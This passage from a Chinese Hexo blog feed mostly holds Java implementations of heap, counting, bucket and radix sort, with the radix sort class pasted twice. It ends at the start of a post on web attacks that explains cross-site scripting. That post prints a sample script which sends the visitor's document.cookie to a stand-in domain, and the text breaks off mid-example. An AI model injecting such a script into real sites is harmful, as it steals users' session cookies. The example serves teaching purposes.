&gt;temp)&#123;<span class="hljs-comment">//如果子节点大于父节点，将子节点值赋给父节点（不用进行交换）</span><br>                arr[i] = arr[k];<br>                i = k;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        arr[i] = temp;<span class="hljs-comment">//将temp值放到最终的位置</span><br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 交换元素</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> arr</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> a</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> b</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> []arr,<span class="hljs-keyword">int</span> a ,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> temp=arr[a];<br>        arr[a] = arr[b];<br>        arr[b] = temp;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果</p><p>[1, 2, 3, 4, 5, 6, 7, 8, 9]</p><p><strong>最后</strong></p><p>　　堆排序是一种选择排序，整体主要由构建初始堆+交换堆顶元素和末尾元素并重建堆两部分组成。其中构建初始堆经推导复杂度为O(n)，在交换并重建堆的过程中，需交换n-1次，而重建堆的过程中，根据完全二叉树的性质，[log2(n-1),log2(n-2)…1]逐步递减，近似为nlogn。所以堆排序时间复杂度一般认为就是O(nlogn)级。</p><h1 id="8-计数排序"><a href="#8-计数排序" class="headerlink" title="8.  计数排序"></a>8.  计数排序</h1><p>基数排序 、计数排序 、 桶排序这三种排序算法都利用了桶的概念，但对桶的使用方法上有明显差异：</p><ul><li>计数排序：每个桶只存储单一键值；</li><li>桶排序：每个桶存储一定范围的数值；</li><li>基数排序：根据键值的每位数字来分配桶；</li></ul><hr><p>计数排序的核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。</p><p><strong>计数排序的特征</strong></p><p>当输入的元素是 n 个 0 到 k 之间的整数时，它的运行时间是 Θ(n + k)。计数排序不是比较排序，排序的速度快于任何比较排序算法。</p><p>由于用来计数的数组C的长度取决于待排序数组中数据的范围（等于待排序数组的最大值与最小值的差加上1），这使得计数排序对于数据范围很大的数组，需要大量时间和内存。例如：计数排序是用来排序0到100之间的数字的最好的算法，但是它不适合按字母顺序排序人名。但是，计数排序可以用在基数排序中的算法来排序数据范围很大的数组。</p><p>通俗地理解，例如有 10 个年龄不同的人，统计出有 8 个人的年龄比 A 小，那 A 的年龄就排在第 9 位,用这个方法可以得到其他每个人的位置,也就排好了序。当然，年龄有重复时需要特殊处理（保证稳定性），这就是为什么最后要反向填充目标数组，以及将每个数字的统计减去 1 的原因。</p><p> 算法的步骤如下：</p><ul><li>找出待排序的数组中最大和最小的元素</li><li>统计数组中每个值为i的元素出现的次数，存入数组C的第i项</li><li>对所有的计数累加（从C中的第一个元素开始，每一项和前一项相加）</li><li><p>反向填充目标数组：将每个元素i放在新数组的第C(i)项，每放一个元素就将C(i)减去1</p><p><strong>动图演示</strong></p></li></ul><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/countingsort.gif" alt="img" style="zoom:50%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CountingSort</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IArraySort</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] sort(<span class="hljs-keyword">int</span>[] sourceArray) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 对 arr 进行拷贝，不改变参数内容</span><br>        <span class="hljs-keyword">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);<br><br>        <span class="hljs-keyword">int</span> maxValue = getMaxValue(arr);<br><br>        <span class="hljs-keyword">return</span> countingSort(arr, maxValue);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] countingSort(<span class="hljs-keyword">int</span>[] arr, <span class="hljs-keyword">int</span> maxValue) &#123;<br>        <span class="hljs-keyword">int</span> bucketLen = maxValue + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">int</span>[] bucket = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[bucketLen];<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> value : arr) &#123;<br>            bucket[value]++;<br>        &#125;<br><br>        <span class="hljs-keyword">int</span> sortedIndex = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; bucketLen; j++) &#123;<br>            <span class="hljs-keyword">while</span> (bucket[j] &gt; <span class="hljs-number">0</span>) &#123;<br>                arr[sortedIndex++] = j;<br>                bucket[j]--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> arr;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getMaxValue</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> maxValue = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> value : arr) &#123;<br>            <span class="hljs-keyword">if</span> (maxValue &lt; value) &#123;<br>                maxValue = value;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> maxValue;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="9-桶排序排序"><a href="#9-桶排序排序" class="headerlink" title="9. 桶排序排序"></a>9. 桶排序排序</h1><p>桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。为了使桶排序更加高效，我们需要做到这两点：</p><ul><li>在额外空间充足的情况下，尽量增大桶的数量</li><li>使用的映射函数能够将输入的 N 个数据均匀的分配到 K 个桶中</li></ul><p>同时，对于桶中元素的排序，选择何种比较排序算法对于性能的影响至关重要。</p><ol><li>什么时候最快</li></ol><p>当输入的数据可以均匀的分配到每一个桶中。</p><ol><li>什么时候最慢</li></ol><p>当输入的数据被分配到了同一个桶中。</p><ol><li>示意图</li></ol><p>元素分布在桶中：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/_sort_1.svg_.png" alt="img"></p><p>然后，元素在每个桶中排序：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/_sort_2.svg_.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BucketSort</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IArraySort</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> InsertSort insertSort = <span class="hljs-keyword">new</span> InsertSort();<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] sort(<span class="hljs-keyword">int</span>[] sourceArray) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 对 arr 进行拷贝，不改变参数内容</span><br>        <span class="hljs-keyword">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);<br>        <span class="hljs-comment">// 设置默认桶的大小为5</span><br>        <span class="hljs-keyword">return</span> bucketSort(arr, <span class="hljs-number">5</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] bucketSort(<span class="hljs-keyword">int</span>[] arr, <span class="hljs-keyword">int</span> bucketSize) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (arr.length == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> arr;<br>        &#125;<br><br>        <span class="hljs-keyword">int</span> minValue = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">int</span> maxValue = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> value : arr) &#123;<br>            <span class="hljs-keyword">if</span> (value &lt; minValue) &#123;<br>                minValue = value;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &gt; maxValue) &#123;<br>                maxValue = value;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//计算桶的数量</span><br>        <span class="hljs-keyword">int</span> bucketCount = (<span class="hljs-keyword">int</span>) Math.floor((maxValue - minValue) / bucketSize) + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">int</span>[][] buckets = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[bucketCount][<span class="hljs-number">0</span>];<br><br>        <span class="hljs-comment">// 利用映射函数将数据分配到各个桶中</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            <span class="hljs-keyword">int</span> index = (<span class="hljs-keyword">int</span>) Math.floor((arr[i] - minValue) / bucketSize);<br>            buckets[index] = arrAppend(buckets[index], arr[i]);<br>        &#125;<br><br>        <span class="hljs-keyword">int</span> arrIndex = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span>[] bucket : buckets) &#123;<br>            <span class="hljs-keyword">if</span> (bucket.length &lt;= <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-comment">// 对每个桶进行排序，这里使用了插入排序</span><br>            bucket = insertSort.sort(bucket);<br>            <span class="hljs-comment">//收集，按顺序访问桶，将所有元素放回输出数组中</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> value : bucket) &#123;<br>                arr[arrIndex++] = value;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> arr;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 自动扩容，并保存数据</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> arr</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> value</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] arrAppend(<span class="hljs-keyword">int</span>[] arr, <span class="hljs-keyword">int</span> value) &#123;<br>        arr = Arrays.copyOf(arr, arr.length + <span class="hljs-number">1</span>);<br>        arr[arr.length - <span class="hljs-number">1</span>] = value;<br>        <span class="hljs-keyword">return</span> arr;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="10-基数排序"><a href="#10-基数排序" class="headerlink" title="10. 基数排序"></a>10. 基数排序</h1><p>基数排序是一种非比较型整数排序算法，其原理是将整数按位数切割成不同的数字，然后按每个位数分别比较。由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序也不是只能使用于整数。</p><p>LSD 基数排序动图演示</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/radixsort.gif" alt="img" style="zoom:50%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 基数排序</span><br><span class="hljs-comment"> * 考虑负数的情况还可以参考： https://code.i-harness.com/zh-CN/q/e98fa9</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RadixSort</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IArraySort</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] sort(<span class="hljs-keyword">int</span>[] sourceArray) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 对 arr 进行拷贝，不改变参数内容</span><br>        <span class="hljs-keyword">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);<br><br>        <span class="hljs-keyword">int</span> maxDigit = getMaxDigit(arr);<br>        <span class="hljs-keyword">return</span> radixSort(arr, maxDigit);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取最高位数</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getMaxDigit</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> maxValue = getMaxValue(arr);<br>        <span class="hljs-keyword">return</span> getNumLenght(maxValue);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getMaxValue</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> maxValue = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> value : arr) &#123;<br>            <span class="hljs-keyword">if</span> (maxValue &lt; value) &#123;<br>                maxValue = value;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> maxValue;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getNumLenght</span><span class="hljs-params">(<span class="hljs-keyword">long</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">int</span> lenght = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">long</span> temp = num; temp != <span class="hljs-number">0</span>; temp /= <span class="hljs-number">10</span>) &#123;<br>            lenght++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> lenght;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] radixSort(<span class="hljs-keyword">int</span>[] arr, <span class="hljs-keyword">int</span> maxDigit) &#123;<br>        <span class="hljs-keyword">int</span> mod = <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">int</span> dev = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; maxDigit; i++, dev *= <span class="hljs-number">10</span>, mod *= <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-comment">// 考虑负数的情况，这里扩展一倍队列数，其中 [0-9]对应负数，[10-19]对应正数 (bucket + 10)</span><br>            <span class="hljs-keyword">int</span>[][] counter = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[mod * <span class="hljs-number">2</span>][<span class="hljs-number">0</span>];<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; arr.length; j++) &#123;<br>                <span class="hljs-keyword">int</span> bucket = ((arr[j] % mod) / dev) + mod;<br>                counter[bucket] = arrayAppend(counter[bucket], arr[j]);<br>            &#125;<br><br>            <span class="hljs-keyword">int</span> pos = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span>[] bucket : counter) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> value : bucket) &#123;<br>                    arr[pos++] = value;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> arr;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 自动扩容，并保存数据</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> arr</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> value</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] arrayAppend(<span class="hljs-keyword">int</span>[] arr, <span class="hljs-keyword">int</span> value) &#123;<br>        arr = Arrays.copyOf(arr, arr.length + <span class="hljs-number">1</span>);<br>        arr[arr.length - <span class="hljs-number">1</span>] = value;<br>        <span class="hljs-keyword">return</span> arr;<br>    &#125;<br>&#125;<span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 基数排序</span><br><span class="hljs-comment"> * 考虑负数的情况还可以参考： https://code.i-harness.com/zh-CN/q/e98fa9</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RadixSort</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IArraySort</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] sort(<span class="hljs-keyword">int</span>[] sourceArray) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 对 arr 进行拷贝，不改变参数内容</span><br>        <span class="hljs-keyword">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);<br><br>        <span class="hljs-keyword">int</span> maxDigit = getMaxDigit(arr);<br>        <span class="hljs-keyword">return</span> radixSort(arr, maxDigit);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取最高位数</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getMaxDigit</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> maxValue = getMaxValue(arr);<br>        <span class="hljs-keyword">return</span> getNumLenght(maxValue);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getMaxValue</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> maxValue = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> value : arr) &#123;<br>            <span class="hljs-keyword">if</span> (maxValue &lt; value) &#123;<br>                maxValue = value;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> maxValue;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getNumLenght</span><span class="hljs-params">(<span class="hljs-keyword">long</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">int</span> lenght = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">long</span> temp = num; temp != <span class="hljs-number">0</span>; temp /= <span class="hljs-number">10</span>) &#123;<br>            lenght++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> lenght;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] radixSort(<span class="hljs-keyword">int</span>[] arr, <span class="hljs-keyword">int</span> maxDigit) &#123;<br>        <span class="hljs-keyword">int</span> mod = <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">int</span> dev = <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; maxDigit; i++, dev *= <span class="hljs-number">10</span>, mod *= <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-comment">// 考虑负数的情况，这里扩展一倍队列数，其中 [0-9]对应负数，[10-19]对应正数 (bucket + 10)</span><br>            <span class="hljs-keyword">int</span>[][] counter = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[mod * <span class="hljs-number">2</span>][<span class="hljs-number">0</span>];<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; arr.length; j++) &#123;<br>                <span class="hljs-keyword">int</span> bucket = ((arr[j] % mod) / dev) + mod;<br>                counter[bucket] = arrayAppend(counter[bucket], arr[j]);<br>            &#125;<br><br>            <span class="hljs-keyword">int</span> pos = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span>[] bucket : counter) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> value : bucket) &#123;<br>                    arr[pos++] = value;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> arr;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 自动扩容，并保存数据</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> arr</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> value</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] arrayAppend(<span class="hljs-keyword">int</span>[] arr, <span class="hljs-keyword">int</span> value) &#123;<br>        arr = Arrays.copyOf(arr, arr.length + <span class="hljs-number">1</span>);<br>        arr[arr.length - <span class="hljs-number">1</span>] = value;<br>        <span class="hljs-keyword">return</span> arr;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">整理了十种排序算法的思路和实现。</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="排序" scheme="http://example.com/tags/%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>网络攻击</title>
    <link href="http://example.com/2021/03/17/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB/"/>
    <id>http://example.com/2021/03/17/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB/</id>
    <published>2021-03-17T12:40:09.000Z</published>
    <updated>2021-03-19T09:37:34.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-跨站脚本攻击"><a href="#1-跨站脚本攻击" class="headerlink" title="1. 跨站脚本攻击"></a>1. 跨站脚本攻击</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p><h2 id="1-2-攻击原理"><a href="#1-2-攻击原理" class="headerlink" title="1.2 攻击原理"></a>1.2 攻击原理</h2><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">&quot;//domain.com/?c=&quot;</span> + <span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>之后该内容可能会被渲染成以下形式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span 